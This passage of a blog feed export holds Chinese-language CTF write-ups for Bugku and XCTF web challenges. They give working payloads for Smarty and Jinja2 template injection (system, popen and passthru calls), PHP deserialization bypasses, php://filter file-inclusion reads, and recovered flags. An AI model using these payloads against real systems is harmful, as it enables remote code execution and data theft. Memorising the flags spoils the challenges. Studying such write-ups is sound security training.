<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git show </span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/23/bugku/QQ%E6%88%AA%E5%9B%BE20230714122302.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git show 40c6d51</span><br></pre></td></tr></table></figure>

<p>看到flag</p>
<h2 id="聪明的php"><a href="#聪明的php" class="headerlink" title="聪明的php"></a>聪明的php</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">pass a parameter <span class="keyword">and</span> maybe the flag file<span class="string">&#x27;s filename is random :&gt; &lt;?php</span></span><br><span class="line"><span class="string">include(&#x27;</span>./libs/Smarty.<span class="keyword">class</span>.php<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">echo &quot;pass a parameter and maybe the flag file&#x27;</span>s filename is random :&gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string"><span class="subst">$smarty</span> = new Smarty();</span></span><br><span class="line"><span class="string">if(<span class="subst">$_GET</span>)&#123;</span></span><br><span class="line"><span class="string">    highlight_file(&#x27;index.php&#x27;);</span></span><br><span class="line"><span class="string">    foreach (<span class="subst">$_GET</span> AS <span class="subst">$key</span> =&gt; <span class="subst">$value</span>)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        print <span class="subst">$key</span>.&quot;</span>\n<span class="string">&quot;;</span></span><br><span class="line"><span class="string">        if(preg_match(&quot;</span>/flag|\/flag/i<span class="string">&quot;, <span class="subst">$value</span>))&#123;</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">            <span class="subst">$smarty</span>-&gt;display(&#x27;./template.html&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &#125;elseif(preg_match(&quot;</span>/system|readfile|gz|exec|<span class="keyword">eval</span>|cat|assert|file|fgets/i<span class="string">&quot;, <span class="subst">$value</span>))&#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            <span class="subst">$smarty</span>-&gt;display(&#x27;./template.html&#x27;);            </span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">        &#125;else&#123;</span></span><br><span class="line"><span class="string">            <span class="subst">$smarty</span>-&gt;display(&quot;</span><span class="keyword">eval</span>:<span class="string">&quot;.<span class="subst">$value</span>);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt; </span></span><br></pre></td></tr></table></figure>

<p><strong>smarty模板注入</strong></p>
<p>常用注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">常用payload</span><br><span class="line">&#123;if phpinfo()&#125;&#123;/if&#125;</span><br><span class="line">&#123;if system(&#x27;ls&#x27;)&#125;&#123;/if&#125;</span><br><span class="line">&#123;if readfile(&#x27;/flag&#x27;)&#125;&#123;/if&#125; </span><br><span class="line">&#123;if show_source(&#x27;/flag&#x27;)&#125;&#123;/if&#125;</span><br><span class="line">&#123;if system(&#x27;cat ../../../flag&#x27;)&#125;&#123;/if&#125; </span><br><span class="line">smarty中的&#123;if&#125;标签中可以执行php语句</span><br></pre></td></tr></table></figure>

<p>本题过滤了好多，所以</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;passthru(%27tac%20/_26225%27)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id><a href="#" class="headerlink" title></a></h4>]]></content>
      <tags>
        <tag>bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界web</title>
    <url>/2023/03/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/</url>
    <content><![CDATA[<p>  攻防世界web</p>
   <span id="more"></span>

<h2 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h2><p><code>__wakeup()执行漏洞：一个字符串或对象被序列化后，如果其属性被修改，则不会执行__wakeup()函数，这也是一个绕过点。</code></p>
<p>O:7:”chybeta”:1:{s:4:”test”;s:3:”123”;}</p>
<p>这里的O呢就是object对象的意思</p>
<p>数字7代表着对象的函数名有7个占位</p>
<p>然后就是对象名了</p>
<p>这个数字1表示对象里有一个变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class xctf&#123;</span><br><span class="line">public $flag = &#x27;111&#x27;;</span><br><span class="line">public function __wakeup()&#123;</span><br><span class="line">exit(&#x27;bad requests&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure>

<p><code>__wakeup()执行漏洞：一个字符串或对象被序列化后，如果其属性被修改，则不会执行__wakeup()函数，这也是一个绕过点。</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class xctf&#123;</span><br><span class="line">public $flag = &#x27;111&#x27;;</span><br><span class="line">public function __wakeup()&#123;</span><br><span class="line">exit(&#x27;bad requests&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = new xctf();</span><br><span class="line">print(serialize($c));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>run 结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>更改属性跳过__wake</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>cyberpeace{80472bc9cb95f5a442c6b980d0a2f2ed}</p>
<h2 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h2><p><code>@</code>是可以屏蔽函数执行过程中遇到问题而产生的一些错误、警告信息，这样用户就看不到程序的出错信息。这样除了用户界面会友好一些外，更重要的是安全性，因为屏蔽了出错文件的路径等信息。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; <span class="comment">//\d匹配数字，oc:+4绕过</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Demo</span>(<span class="string">&#x27;fl4g.php&#x27;</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>, <span class="string">&#x27;O:+4&#x27;</span>,<span class="variable">$c</span>); <span class="comment">//反复测试不能手动改，由于反序列化后出现乱码，复制之后会改变导致序列化结果不一样，只能由str_replace替换，否则base64编码不一样。无法爆出结果。找了20分钟的原因。。。</span></span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:1:&#x27;</span>, <span class="string">&#x27;:2:&#x27;</span>,<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$c</span>));</span><br></pre></td></tr></table></figure>

<p>ctf{b17bd4c7-34c9-4526-8fa8-a0794a197013}</p>
<h2 id="fileclude"><a href="#fileclude" class="headerlink" title="fileclude"></a>fileclude</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&quot;file1&quot;]) &amp;&amp; isset($_GET[&quot;file2&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">    $file1 = $_GET[&quot;file1&quot;];</span><br><span class="line">    $file2 = $_GET[&quot;file2&quot;];</span><br><span class="line">    if(!empty($file1) &amp;&amp; !empty($file2))</span><br><span class="line">    &#123;</span><br><span class="line">        if(file_get_contents($file2) === &quot;hello ctf&quot;)</span><br><span class="line">        &#123;</span><br><span class="line">            include($file1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">        die(&quot;NONONO&quot;);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:63403/?file1=php://filter/read=convert.base64-encode/resource=flag.php&amp;file2=php://input</span><br></pre></td></tr></table></figure>

<p>同时hackbar传参hello ctf</p>
<p>cyberpeace{e0487d7ed7e17a96dea9922a9a1d19a2}</p>
<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$key1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$key2</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$a</span>) &gt; <span class="number">6000000</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>) &lt;= <span class="number">3</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$b</span>) &amp;&amp; <span class="string">&#x27;8b184b&#x27;</span> === <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>),-<span class="number">6</span>,<span class="number">6</span>))&#123;</span><br><span class="line">        <span class="variable">$key1</span> = <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Emmm...再想想&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Emmm...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=(<span class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>) &amp;&amp; !<span class="title function_ invoke__">is_numeric</span>(@<span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>]) &amp;&amp; <span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>] &gt; <span class="number">2022</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(@<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">count</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) == <span class="number">2</span> &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>][<span class="number">0</span>]))&#123;</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;DGGJ&quot;</span>, <span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]);</span><br><span class="line">        <span class="variable">$d</span> === <span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;no...&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$val</span>===<span class="string">&quot;DGGJ&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;no......&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$key2</span> = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key1</span> &amp;&amp; <span class="variable">$key2</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;Hgfks.php&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You&#x27;re right&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/m0_51683653/article/details/128839648">https://blog.csdn.net/m0_51683653/article/details/128839648</a></p>
<p>cyberpeace{e8b0e794a7cc1f5d75bae6b3868d77db}</p>
<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$miwen</span>=<span class="string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$_o</span>=<span class="title function_ invoke__">strrev</span>(<span class="variable">$str</span>);   <span class="comment">//字符串反转</span></span><br><span class="line">    <span class="comment">// echo $_o;</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$_0</span>=<span class="number">0</span>;<span class="variable">$_0</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$_o</span>);<span class="variable">$_0</span>++)&#123;</span><br><span class="line">       </span><br><span class="line">        <span class="variable">$_c</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$_o</span>,<span class="variable">$_0</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="variable">$__</span>=<span class="title function_ invoke__">ord</span>(<span class="variable">$_c</span>)+<span class="number">1</span>; <span class="comment">//ord() 函数返回字符串中第一个字符的 ASCII 值</span></span><br><span class="line">        <span class="variable">$_c</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$__</span>);<span class="comment">//chr() 函数从指定 ASCII 值返回字符。并可以指定ASCII是十进制或是十六进制或是八进制。</span></span><br><span class="line">        <span class="variable">$_</span>=<span class="variable">$_</span>.<span class="variable">$_c</span>;   <span class="comment">// “.” 是字符运算符，作用是把两个字符串连接起来，</span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_rot13</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_</span>)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*str_rot13() 函数对字符串执行 ROT13 编码。</span></span><br><span class="line"><span class="comment">ROT13 编码是把每一个字母在字母表中向前移动 13 个字母得到。数字和非字母字符保持不变。*/</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   逆向加密算法，解密$miwen就是flag</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>​      substr()</p>
<table>
<thead>
<tr>
<th><em>string</em></th>
<th>必需。规定要返回其中一部分的字符串。</th>
</tr>
</thead>
<tbody><tr>
<td><em>start</em></td>
<td>必需。规定在字符串的何处开始。正数 - 在字符串的指定位置开始负数 - 在从字符串结尾开始的指定位置开始0 - 在字符串中的第一个字符处开始</td>
</tr>
<tr>
<td><em>length</em></td>
<td>可选。规定被返回字符串的长度。默认是直到字符串的结尾。正数 - 从 <em>start</em> 参数所在的位置返回的长度负数 - 从字符串末端返回的长度</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str=&#x27;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&#x27;;</span><br><span class="line">$_ = base64_decode(strrev(str_rot13($str)));</span><br><span class="line">$_o=NULL;</span><br><span class="line">for($_0=0;$_0&lt;strlen($_);$_0++)&#123;    </span><br><span class="line">        $_c=substr($_,$_0,1);  </span><br><span class="line">        $__=ord($_c)-1;  </span><br><span class="line">        $_c=chr($__);  </span><br><span class="line">        $_o=$_o.$_c;   </span><br><span class="line">    &#125; </span><br><span class="line">echo strrev($_o);//先反转，所以解密最后反转</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Web-python-template-injection"><a href="#Web-python-template-injection" class="headerlink" title="Web_python_template_injection"></a>Web_python_template_injection</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Cat"><a href="#Cat" class="headerlink" title="Cat"></a>Cat</h2><p>像是个命令执行，但都无果，传入的值被url编码，%80，传入看到报错内容</p>
<p><img src="/2023/03/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/QQ%E6%88%AA%E5%9B%BE20230612105121.png"></p>
<p>可以看到当前路径，python框架Django</p>
<p>可以通过在@ 来读取文件。当且仅当文件中存在中文字符的时候，<a href="https://so.csdn.net/so/search?q=Django&spm=1001.2101.3001.7020">Django</a> 才会报错导致获取文件内容。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@/opt/api/api/settings.py</span><br><span class="line">@/opt/api/database.sqlite3</span><br></pre></td></tr></table></figure>

<h2 id="fileinclude"><a href="#fileinclude" class="headerlink" title="fileinclude"></a>fileinclude</h2><p>查看源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( !ini_get(&#x27;display_errors&#x27;) ) &#123;</span><br><span class="line">  ini_set(&#x27;display_errors&#x27;, &#x27;On&#x27;);</span><br><span class="line">  &#125;</span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line">$lan = $_COOKIE[&#x27;language&#x27;];</span><br><span class="line">if(!$lan)</span><br><span class="line">&#123;</span><br><span class="line">	@setcookie(&quot;language&quot;,&quot;english&quot;);</span><br><span class="line">	@include(&quot;english.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	@include($lan.&quot;.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$x=file_get_contents(&#x27;index.php&#x27;);</span><br><span class="line">echo $x;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>如果cookie 存在则文件包含</p>
<p>这里伪协议读取即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure>

<h2 id="shrine"><a href="#shrine" class="headerlink" title="shrine"></a>shrine</h2><p>查看源码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&lt;path:shrine&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shrine</span>(<span class="params">shrine</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">safe_jinja</span>(<span class="params">s</span>):</span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>) //将（）替换为空</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config.FLAG&#125;&#125;</span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config.FLAG&#125;&#125;</span><br><span class="line">&#123;&#123;request.application.__self__._get_data_for_json.__globals__[&#x27;json&#x27;].JSONEncoder.default.__globals__[&#x27;current_app&#x27;].config[&#x27;FLAG&#x27;]&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="easyphp-1"><a href="#easyphp-1" class="headerlink" title="easyphp"></a>easyphp</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$key1 = 0;</span><br><span class="line">$key2 = 0;</span><br><span class="line"></span><br><span class="line">$a = $_GET[&#x27;a&#x27;];</span><br><span class="line">$b = $_GET[&#x27;b&#x27;];</span><br><span class="line"></span><br><span class="line">if(isset($a) &amp;&amp; intval($a) &gt; 6000000 &amp;&amp; strlen($a) &lt;= 3)&#123;</span><br><span class="line">    if(isset($b) &amp;&amp; &#x27;8b184b&#x27; === substr(md5($b),-6,6))&#123;</span><br><span class="line">        $key1 = 1;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;Emmm...再想想&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">    die(&quot;Emmm...&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$c=(array)json_decode(@$_GET[&#x27;c&#x27;]);</span><br><span class="line">if(is_array($c) &amp;&amp; !is_numeric(@$c[&quot;m&quot;]) &amp;&amp; $c[&quot;m&quot;] &gt; 2022)&#123;</span><br><span class="line">    if(is_array(@$c[&quot;n&quot;]) &amp;&amp; count($c[&quot;n&quot;]) == 2 &amp;&amp; is_array($c[&quot;n&quot;][0]))&#123;</span><br><span class="line">        $d = array_search(&quot;DGGJ&quot;, $c[&quot;n&quot;]);</span><br><span class="line">        $d === false?die(&quot;no...&quot;):NULL;</span><br><span class="line">        foreach($c[&quot;n&quot;] as $key=&gt;$val)&#123;</span><br><span class="line">            $val===&quot;DGGJ&quot;?die(&quot;no......&quot;):NULL;</span><br><span class="line">        &#125;</span><br><span class="line">        $key2 = 1;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;no hack&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;no&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($key1 &amp;&amp; $key2)&#123;</span><br><span class="line">    include &quot;Hgfks.php&quot;;</span><br><span class="line">    echo &quot;You&#x27;re right&quot;.&quot;\n&quot;;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>a的值用科学计数法绕过a&#x3D;1e9，b的值爆破</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">for i in range(100000):</span><br><span class="line">    b=i.to_bytes(22, &#x27;big&#x27;)</span><br><span class="line">    m=hashlib.md5(str(i).encode()).hexdigest()</span><br><span class="line">    if(m[-6:]==&quot;8b184b&quot;):</span><br><span class="line">        print(i)</span><br><span class="line">        print(m)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>攻防世界</category>
      </categories>
      <tags>
        <tag>攻防世界</tag>
      </tags>
  </entry>
  <entry>
    <title>aes</title>
    <url>/2023/09/28/aes/</url>
    <content><![CDATA[<p><img src="https://s3.bmp.ovh/imgs/2023/09/29/08da9dd038320582.png"></p>
<span id="more"></span>

<h1 id="ACTF新生赛2020-crypto-aes"><a href="#ACTF新生赛2020-crypto-aes" class="headerlink" title="[ACTF新生赛2020]crypto-aes"></a>[ACTF新生赛2020]crypto-aes</h1><p>题目</p>
